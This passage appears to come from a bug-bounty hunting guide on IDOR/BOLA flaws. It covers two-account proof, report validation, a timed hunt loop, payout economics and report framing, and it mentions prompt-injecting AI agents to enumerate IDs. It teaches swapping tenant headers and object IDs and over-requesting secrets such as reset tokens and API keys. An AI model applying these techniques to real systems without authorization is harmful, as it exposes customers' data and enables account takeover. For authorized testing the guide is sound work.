- **Indirect prompt injection for cross-tenant tool-use** — bulk-enumerate IDs via agent tool prompts. OWASP LLM06:2025 at https://genai.owasp.org/llmrisk/llm06-sensitive-information-disclosure/, Tenable disclosed 2024 analysis at https://tenable.com/blog/what-you-must-know-about-the-owasp-top-10-for-llm-applications-2025-update.

## Gate 0 Validation

Before you write the report, prove these five things:

1. **Concrete demonstration with two accounts.** Two users (Alice and Bob), two screenshots showing Bob's data accessed from Alice's session. Burp request/response pair side-by-side. Don't dump 1000 records — three is enough (one is enough for most triagers). For destructive IDOR, demonstrate against a friend's account or a controlled test account, never against a real user.

2. **Business loss mapping.** Map to: customer PII exposure (count records), credential theft (`resetPasswordToken` field), financial state disclosure (account balance, subscription tier), destructive impact (deleted resources count), compliance violation (GDPR/HIPAA/PCI/SOC2). Pick *one* and quantify.

3. **Reproducibility in 10 minutes.** Write the curl one-liner. Document how to get the second account (free signup? team invite?). Triagers close anything they can't repro at lunch.

4. **Scope check.** Both accounts in scope. Cross-tenant target in scope. Asset reachable now. Vuln present now (re-test before submission — patches happen during your write-up, especially for IDOR which is often single-line code fix).

5. **PoC artifacts**: 30-60 second screen recording showing both accounts (Burp's "compare two sessions" feature is great here — splits the screen). Burp request/response screenshots with redacted PII (bar over emails/names). Curl command in plain text. Two-account session log as raw text.

If any of the 5 fails: **stop**. You have a finding, not a report. Submitting one-account "could be IDOR" gets N/A and a credibility hit.

## Top-Tier Hunter Decision Engine

IDOR/BOLA hunting is a two-account discipline. Before reporting anything, label the actors: attacker account, victim account, tenant A, tenant B, role A, role B. The strongest reports prove a server-side authorization decision used attacker identity for authentication but victim-controlled object/tenant/role for authorization.

**Stop in 10 minutes** when the object is public in the UI, the second account receives 403, the modified field does not persist, or the leak is only schema/endpoint discovery. **Keep chaining** when a cross-object read exposes reset tokens, API keys, role fields, billing state, webhook secrets, private files, or admin-only metadata. **Report immediately** when a single primitive yields cross-tenant read/write, destructive mutation, or ATO with your own victim account.

**Minimum proof ceiling:** never enumerate real customer IDs. Use two accounts you control, friend/test tenants with consent, or seeded demo data. For destructive mutation IDOR, destroy your own second account's object and show recovery steps. For cross-tenant read, capture one redacted record plus the object ID and tenant ID mismatch; do not bulk dump.

## Anti-Targets / What's Dead

The kill-list. Where NOT to point the cannon.

- **"Found IDOR on /api/users/123, returns JSON"** — without two-account proof and victim PII exfil, this is observation not finding. Triagers close one-account "could be" IDOR as N/A. Always set up the second account before reporting.
- **Sequential ID enumeration on public-by-design data** — usernames, public profiles, company names, public posts. If the data is exposed in the UI by clicking "browse users", IDOR on the API returning the same data is duplicate of the UI exposure. Confirm the data is meant to be private before reporting.
- **GraphQL introspection alone** — introspection enabled in production is informative-tier on most programs unless you can demonstrate it leads to actual sensitive-field access. Introspection + nested IDOR pivot pays; introspection alone usually does not.
- **CORS misconfig "could lead to IDOR"** — same as Self-XSS, demonstrate the chain or don't submit. CORS findings are out-of-scope on most program policies including Atlassian, Shopify, GitLab, GitHub.
- **WebSocket frame manipulation without proof of state change** — sending a different `subscribe.channel` frame returns "subscription accepted" but you don't actually receive the data. Validate end-to-end before submission.
- **Mass-assignment without verifying the field stuck** — PATCH response hides the field but the database write succeeded. Always GET after PATCH. If you can't verify, don't submit.
- **JWT claim modification without signature break** — submitting a modified JWT and getting `403` because the signature check caught it is informative-tier. Demonstrate that signature verification is missing OR the server uses request headers despite the JWT claim.
- **CVE replay on patched CMS** — Apache Answer < 1.4.1 (CVE-2024-45719) on a target running 1.5+ is N/A. Re-confirm version and patch level before submitting.
- **"BOLA on `/api/health` returns server uptime"** — public-by-design endpoints aren't BOLA. Make sure the data is genuinely tenant-scoped before claiming cross-tenant.
- **DoS via mass-enumeration** — submitting 100k IDs to slow the server is DoS, not IDOR. File as DoS or skip. Most programs out-of-scope.
- **"I see /api/admin/users in JS bundle"** — endpoint discovery without actual exploitation is reconnaissance, not finding. Hit the endpoint, prove cross-tenant access.
- **Deprecated v1 endpoint that requires deprecated client cert** — deprecated paths that still exist but require dead authentication aren't reachable. Confirm the path is reachable from a live attacker before reporting.

## Notes for the hunter

**24-month meta call-out.** The defining 2025-2026 IDOR story is **multi-tenant header bypass + GraphQL field-level pivot**. CVE-2026-30956 OneUptime (CVSS 9.9), CVE-2026-32131 Zitadel Management API, CVE-2025-64431 Zitadel V2Beta, GHSA-323c-xqcq-fpcp Novu environmentId — the entire wave is "client-controlled tenant identifier accepted server-side." If you hunt one new primitive this quarter, it's the `Tenantid` / `is-multi-tenant-query` / `environmentId` / `projectid` header swap on every multi-tenant SaaS in scope. The second-place meta is **GraphQL nested-object pivot + mutation IDOR** — HackerOne $12.5k Dec 2025, tinopreter $1,500 Feb 2026, all the recent GraphQL bounties. The third-place meta is **AI agent key-mint IDOR** — Paperclip GHSA-3xx2-mqjm-hg9x is the canonical example; expect this class to grow through 2026 as more SaaS adopts agent identities.

**OSS targets where the next 6 months of paying bugs likely are.** Multi-tenant SaaS with GitHub Security Advisory repos (Zitadel, Novu, OneUptime, FastGPT, Paperclip — the ones that already disclosed are likely to have repeat findings). SCIM implementations everywhere (Keycloak issue #46658 is open at writing). GraphQL gateways (Apollo, Hasura, Postgraphile) on enterprise SaaS. Any AI/ML SaaS exposing inference / agent endpoints. Apache projects using UUIDv1 (CodeQL queries from bananabr identify systematically).

**Anti-patterns reminder.** See the Anti-Targets section above. Most-common kills: one-account "could be" IDOR (always need two accounts), GraphQL introspection alone (need the pivot), mass-assignment without verifying the field stuck, JWT modification getting 403 (need signature break or header pivot proof).

**Ground rule for impact in 2026:** single-bug IDOR on read-only PII pays low four-figure to mid four-figure; chained to ATO via reset token leak pays low five-figure to mid five-figure; chained to cross-tenant admin pays mid five-figure; destructive mutation IDOR pays mid four-figure to low five-figure (HackerOne $12,500 case). Always over-request fields when you have cross-tenant read — `resetPasswordToken`, `permissions`, `email`, `internalNotes` — to upgrade impact framing.

**Currency tip:** ~12 of the verified CVEs/GHSAs cited in this skill are from 2024-2026. Re-verify with `verify_citations.py` before finalizing any report citing them; the GitHub Security Advisory data updates frequently and CVSS ratings may shift.

## Top-Tier Operating Manual

**90-minute hunt loop**
1. 0-10 min: create two users and, when possible, two tenants. Name them clearly in cookies, notes, and screenshots: `alice_tenant_a`, `bob_tenant_b`.
2. 10-20 min: build the object map. Capture IDs for users, orgs, projects, teams, files, invoices, webhooks, API keys, jobs, messages, comments, and exports.
3. 20-40 min: run read swaps. Change path IDs, body IDs, query IDs, GraphQL variables, tenant headers, and JWT-visible tenant fields.
4. 40-60 min: run write swaps. Update, delete, share, invite, export, regenerate-token, rotate-secret, and resend-email actions against your own second account objects.
5. 60-75 min: over-request sensitive fields on any successful read. Ask for `resetPasswordToken`, `mfaSecret`, `apiKey`, `webhookSecret`, `role`, `permissions`, `billing`, and `internalNotes`.
6. 75-90 min: frame the strongest chain: read-only privacy, destructive write, cross-tenant admin, or ATO. Kill anything that remains one-account speculation.

**Decision tree**
- If Alice cannot read Bob's object, stop that endpoint and move to the next object type.
- If Alice can read Bob's public object, verify privacy expectation before reporting.
- If Alice can read Bob's private object, immediately test sensitive fields and export endpoints.
- If Alice can write Bob's object, test durability with a follow-up GET and then stop.
- If tenant headers work, test every adjacent service that uses the same gateway.
- If GraphQL entry-point auth holds, pivot through nested fields and parent-child resolvers.

**False-positive graveyard**
- Public profile returned through API: kill unless the field is private in UI.
- GraphQL introspection: kill unless it leads to unauthorized data or mutation.
- 403 on modified ID: kill unless a second route reaches the same object.
- PATCH response echo: kill unless a later GET proves persistence.
- Object ID in JS bundle: reconnaissance only. Hit the endpoint with the wrong user.
- Admin endpoint name disclosure: kill unless the endpoint accepts lower-priv credentials.

**Program economics**
- Cross-tenant SaaS IDOR is the top payout surface because one bug scales to every customer.
- Destructive mutation often pays more than read-only PII when trust or financial records are affected.
- Reset-token, API-key, webhook-secret, and invite-token reads upgrade the finding from privacy to takeover.
- Single-record PII leaks are often medium; bulk export or predictable enumeration raises severity.
- Mature programs heavily discount "only your own organization" findings unless roles or paid tiers are bypassed.

**Report framing**
- Weak: "Changing `id` returns another user's data."
- Strong: "The authorization check binds the session to Alice but trusts the attacker-controlled `projectId` header for tenant scoping. Alice can read Bob Corp's private incident project and explicitly select `createdByUser.resetPasswordToken`, producing full tenant-admin ATO."
- Expected pushback: "IDs are hard to guess." Rebuttal: "IDs are exposed in invitation links, GraphQL edges, exports, and activity feeds; exploitability does not depend on brute force."
- Expected pushback: "Only one record shown." Rebuttal: "I intentionally limited proof to one redacted record; the same missing check applies to the collection endpoint shown in step 5."

**Automation harness**
- Use a two-session mutator that replays Alice's request with Bob's object IDs and compares status, length, and stable JSON fields.
- Maintain `objects.csv`: owner, tenant, role, object_type, object_id, endpoint, expected_access.
- For GraphQL, generate variants by replacing variables and adding sensitive field selections.
- For REST, test path-body mismatch: authorize on `/me/{alice_id}` while body contains `bob_id`.
- Every successful candidate must run `verify_as_owner`, `verify_as_attacker`, and `verify_after_mutation`.

